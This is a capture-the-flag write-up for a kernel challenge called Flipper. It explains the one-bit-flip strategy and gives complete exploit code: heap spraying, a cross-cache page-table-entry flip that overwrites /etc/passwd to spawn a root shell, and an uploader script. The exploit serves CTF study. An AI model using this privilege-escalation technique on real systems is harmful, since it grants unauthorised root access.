# Pwn

## Flipper

This challenge gives us a one-bit flip primitive, but with two limitations. First, it can only be used once, and second, it can only be used in general-purpose caches with object sizes less than or equal to 0x100.

After analyzing the challenge, I have two thoughts:

1. **Migrate the one-bit flip primitive to UAF, and then use common exploit technique** - we can flip the pointer type member in object, making it point to other objects (victim object). Then, when we free that object, the corrupted pointer which points to the victim object is freed. Since the victim object is still in use, we can spray some controllable objects to occupy the memory, leak address and construct fake object to control RIP.
2. **Flip members used to present privilege in objects** - objects may have some struct members to store privilege information, such as `uid` in cred and `f_flag` flip (I’m not sure). Flipping these members gives victim objects high privilege, and we can indirectly use the victim object to read the flag file. But objects having privilege members are allocated via their own caches, we should play with page allocator to set the heap layout.

At first I chose the first option, `struct poll_list *next` of `struct poll_list` and `struct list_head m_list;` of `struct msg_msg` are my candidate objects to overwrite. But I found if we want to overwrite these objects, I need to do the cross cache attack because we can only allocate chunk in kmalloc-256 at most, meanwhile `struct poll_list` is in kmalloc-1k and `struct msg_msg` is in kmalloc-cg-1k (cache with `GFP_KERNEL_ACCOUNT` flag).

If I need to do cross cache attack, why I don’t choose second option? The data-only attack is easier as there is no need to bypass KASLR. Then there is a question, what objects can be our candidates? As far as I know, objects have members storing privilege information are following:

1. `struct file` - flip the WRITE bit in `f_flags`. I am not familiar with `struct file`, so it is the worst option
2. `struct cred` - flip the uid / gid. Because the uid of default user is 1000, which is 0b1111101000 in binary forat, indicating that there are 6 bits to flipped; in other words, it is “impossible” to escalate privilege by flipping one bit in the `struct cred` (Interesting, author exploits with `struct cred`, so I got a wrong guess)
3. Page table entry - flip the R/W bit. We can mmap /etc/passwd as read-only, and flip the R/W bit of the corresponding PTE. Then we can overwrite /etc/passwd, login as root and get the flag.

Finally, I chose **page table entry** to do one-bit flip. I used some techiques in cross cache attack, overwriting page table entry and using `read(fd, mmap_address, 1)` to check if the memory is writable without segmentation fault happen.

For more detail on overwriting page table entry, you can check out the following slide:
https://github.com/star-sg/Presentations/blob/main/HITCON 2021/The Great Escape - A Case Study of VM Escape and EoP Vulnerabilities(HITCON 2021).pdf

This slide was released by STARLabs as a HITCON conference presentation.



## Exploit code

### `exp.c`

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <assert.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include "keyutils.h"

#define CMD_ALLOC 0x13370000
#define CMD_FLIP  0x13370001

static void perror_exit(const char *msg)
{
    perror(msg);
    exit(1);
}

#define PAGE_SIZE 0x1000
#define MAX_MSGS 256
#define MAX_KEYS 199
#define MAX_MMAP 800
#define SUB_MMAP 16
#define MB (0x100000)

void *mmap_ptrs[MAX_MMAP][SUB_MMAP];
int keys[MAX_KEYS];
int msgs[MAX_MSGS];
int target_fd;
int dev_fd;

struct msg
{
    long mtype;
    char mtext[];
};

int alloc_key(int index, char *payload, int size)
{
    char desc[32] = { 0 };
    int key;

    assert(size >= 0x18);

    size -= 0x18;
    sprintf(desc, "pay%d", index);

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
    if (key == -1)
        perror_exit("add_key");

    return key;
}

long spray_msg(int size, struct msg *msg)
{
    int ret;
    long msqid;

    assert(size >= 0x30 && msg != NULL);
    msg->mtype = 1;

    msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    if (msqid == -1)
        perror_exit("msgget");

    ret = msgsnd(msqid, msg, size - 0x30, 0);
    if (ret == -1)
        perror_exit("msgsnd");

    return msqid;
}

void get_msg(long msqid, int size)
{
    int ret;
    long msgtyp = 0;
    struct msg *msg;

    assert(size >= 0x30);

    size -= 0x30;
    msg = malloc(sizeof(*msg) + size);

    ret = msgrcv(msqid, msg, size, msgtyp, MSG_NOERROR | IPC_NOWAIT);
    if (ret == -1)
        perror_exit("msgrcv");

    free(msg);
}

const char fake_passwd[] = "root::0:0:root:/root:/bin/sh\n"
"daemon:x:1:1:daemon:/usr/sbin:/bin/false\n"
"bin:x:2:2:bin:/bin:/bin/false\n"
"sys:x:3:3:sys:/dev:/bin/false\n"
"sync:x:4:100:sync:/bin:/bin/sync\n"
"mail:x:8:8:mail:/var/spool/mail:/bin/false\n"
"www-data:x:33:33:www-data:/var/www:/bin/false\n"
"operator:x:37:37:Operator:/var:/bin/false\n"
"nobody:x:65534:65534:nobody:/home:/bin/false\n";

int main()
{
    struct msg *msg;
    char payload[0x100];
    void *mmap_ptrs[MAX_MMAP][SUB_MMAP];

    target_fd = open("/etc/passwd", O_RDONLY);
    dev_fd = open("/dev/flipper", O_RDONLY);
    if (dev_fd == -1)
        perror_exit("open flipper");

    msg = malloc(PAGE_SIZE + sizeof(*msg));
    memset(msg->mtext, 'A', PAGE_SIZE);
    // drain pages
    if (!fork()) {
        // drain pages
        for (int i = 0; i < MAX_MSGS; i++)
            msgs[i] = spray_msg(PAGE_SIZE, msg);
        sleep(1000000);
    }

    memset(payload, 'B', sizeof(payload));
    for (int i = 0; i < MAX_MSGS; i++)
        msgs[i] = spray_msg(0x100, msg);
    for (int i = 0; i < 78; i++)
        alloc_key(i, payload, sizeof(payload));

#define BASE_OFFSET 0x100
    for (unsigned long i = 0; i < MAX_MMAP; i++) {
        void *addr = (void *)((i + 1 + BASE_OFFSET) * (2 * MB));
        char c;
        for (int j = 0; j < SUB_MMAP; j++) {
            mmap_ptrs[i][j] = mmap(addr, PAGE_SIZE, PROT_READ, MAP_POPULATE | MAP_SHARED | MAP_FIXED, target_fd, 0);
            if (mmap_ptrs[i][j] == MAP_FAILED)
                perror_exit("mmap");
            c = *(char *)mmap_ptrs[i][j];
            addr += 32 * PAGE_SIZE;
        }
    }

    ioctl(dev_fd, CMD_ALLOC, 0x100);

#define BYTE_OFF 0x2200
#define BIT_OFF 1
    ioctl(dev_fd, CMD_FLIP, (BYTE_OFF << 3) | (BIT_OFF));

    int ret;
    for (unsigned long i = 0; i < MAX_MMAP; i++) {
        for (int j = 0; j < SUB_MMAP; j++) {
            ret = read(target_fd, mmap_ptrs[i][j], 1);
            if (ret != -1) {
                printf("GOOD!\n");
                memcpy(mmap_ptrs[i][j], fake_passwd, sizeof(fake_passwd));
                msync(mmap_ptrs[i][j], PAGE_SIZE, MS_SYNC);
                system("/bin/sh");
                return 0;
            }
        }
    }
    printf("FAILED\n");

    return 0;
}
```

### `keyutils.h`

```c
#include <sys/types.h>
#include <stdint.h>

extern const char keyutils_version_string[];
extern const char keyutils_build_string[];

/* key serial number */
typedef int32_t key_serial_t;

/* special process keyring shortcut IDs */
#define KEY_SPEC_THREAD_KEYRING         -1      /* - key ID for thread-specific keyring */
#define KEY_SPEC_PROCESS_KEYRING        -2      /* - key ID for process-specific keyring */
#define KEY_SPEC_SESSION_KEYRING        -3      /* - key ID for session-specific keyring */
#define KEY_SPEC_USER_KEYRING           -4      /* - key ID for UID-specific keyring */
#define KEY_SPEC_USER_SESSION_KEYRING   -5      /* - key ID for UID-session keyring */
#define KEY_SPEC_GROUP_KEYRING          -6      /* - key ID for GID-specific keyring */
#define KEY_SPEC_REQKEY_AUTH_KEY        -7      /* - key ID for assumed request_key auth key */

/* request-key default keyrings */
#define KEY_REQKEY_DEFL_NO_CHANGE               -1
#define KEY_REQKEY_DEFL_DEFAULT                 0
#define KEY_REQKEY_DEFL_THREAD_KEYRING          1
#define KEY_REQKEY_DEFL_PROCESS_KEYRING         2
#define KEY_REQKEY_DEFL_SESSION_KEYRING         3
#define KEY_REQKEY_DEFL_USER_KEYRING            4
#define KEY_REQKEY_DEFL_USER_SESSION_KEYRING    5
#define KEY_REQKEY_DEFL_GROUP_KEYRING           6

/* key handle permissions mask */
typedef uint32_t key_perm_t;

#define KEY_POS_VIEW    0x01000000      /* possessor can view a key's attributes */
#define KEY_POS_READ    0x02000000      /* possessor can read key payload / view keyring */
#define KEY_POS_WRITE   0x04000000      /* possessor can update key payload / add link to keyring */
#define KEY_POS_SEARCH  0x08000000      /* possessor can find a key in search / search a keyring */
#define KEY_POS_LINK    0x10000000      /* possessor can create a link to a key/keyring */
#define KEY_POS_SETATTR 0x20000000      /* possessor can set key attributes */
#define KEY_POS_ALL     0x3f000000

#define KEY_USR_VIEW    0x00010000      /* user permissions... */
#define KEY_USR_READ    0x00020000
#define KEY_USR_WRITE   0x00040000
#define KEY_USR_SEARCH  0x00080000
#define KEY_USR_LINK    0x00100000
#define KEY_USR_SETATTR 0x00200000
#define KEY_USR_ALL     0x003f0000

#define KEY_GRP_VIEW    0x00000100      /* group permissions... */
#define KEY_GRP_READ    0x00000200
#define KEY_GRP_WRITE   0x00000400
#define KEY_GRP_SEARCH  0x00000800
#define KEY_GRP_LINK    0x00001000
#define KEY_GRP_SETATTR 0x00002000
#define KEY_GRP_ALL     0x00003f00

#define KEY_OTH_VIEW    0x00000001      /* third party permissions... */
#define KEY_OTH_READ    0x00000002
#define KEY_OTH_WRITE   0x00000004
#define KEY_OTH_SEARCH  0x00000008
#define KEY_OTH_LINK    0x00000010
#define KEY_OTH_SETATTR 0x00000020
#define KEY_OTH_ALL     0x0000003f

/* keyctl commands */
#define KEYCTL_GET_KEYRING_ID           0       /* ask for a keyring's ID */
#define KEYCTL_JOIN_SESSION_KEYRING     1       /* join or start named session keyring */
#define KEYCTL_UPDATE                   2       /* update a key */
#define KEYCTL_REVOKE                   3       /* revoke a key */
#define KEYCTL_CHOWN                    4       /* set ownership of a key */
#define KEYCTL_SETPERM                  5       /* set perms on a key */
#define KEYCTL_DESCRIBE                 6       /* describe a key */
#define KEYCTL_CLEAR                    7       /* clear contents of a keyring */
#define KEYCTL_LINK                     8       /* link a key into a keyring */
#define KEYCTL_UNLINK                   9       /* unlink a key from a keyring */
#define KEYCTL_SEARCH                   10      /* search for a key in a keyring */
#define KEYCTL_READ                     11      /* read a key or keyring's contents */
#define KEYCTL_INSTANTIATE              12      /* instantiate a partially constructed key */
#define KEYCTL_NEGATE                   13      /* negate a partially constructed key */
#define KEYCTL_SET_REQKEY_KEYRING       14      /* set default request-key keyring */
#define KEYCTL_SET_TIMEOUT              15      /* set timeout on a key */
#define KEYCTL_ASSUME_AUTHORITY         16      /* assume authority to instantiate key */
#define KEYCTL_GET_SECURITY             17      /* get key security label */
#define KEYCTL_SESSION_TO_PARENT        18      /* set my session keyring on my parent process */
#define KEYCTL_REJECT                   19      /* reject a partially constructed key */
#define KEYCTL_INSTANTIATE_IOV          20      /* instantiate a partially constructed key */
#define KEYCTL_INVALIDATE               21      /* invalidate a key */
#define KEYCTL_GET_PERSISTENT           22      /* get a user's persistent keyring */
#define __NR_add_key 248

key_serial_t  add_key(const char *type,
                            const char *description,
                            const void *payload,
                            size_t plen,
                            key_serial_t ringid)
{
        return syscall(__NR_add_key,
                       type, description, payload, plen, ringid);
}
```

### `Makefile`

```Makefile
all:
    musl-gcc -static -o exp exp.c
    strip exp
```

### `exp.py`

```python
#!/usr/bin/python3

from pwn import *
import time
import base64
import subprocess

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#r = process("./start-qemu.sh")
r = remote("others.2023.zer0pts.com", 9007)
cmd = r.recvline()[:-1].decode()
answer = subprocess.check_output(cmd.split(' '))
print(answer)
r.sendlineafter("hashcash token:", answer)

exp = open("exp", "rb").read()

payload = base64.b64encode(exp).decode()

size = 1000
for i in range(0, len(payload), 1000):
    r.recvuntil("~ $")
    r.sendline(f"echo -n {payload[i:i+size]} >> /tmp/exp")
    print(i)

r.recvuntil("~ $")
r.sendline("cat /tmp/exp | base64 -d > /tmp/exp2")
r.recvuntil("~ $")
r.sendline("chmod +x /tmp/exp2")
r.recvuntil("~ $")
r.sendline("/tmp/exp2")
r.interactive()
```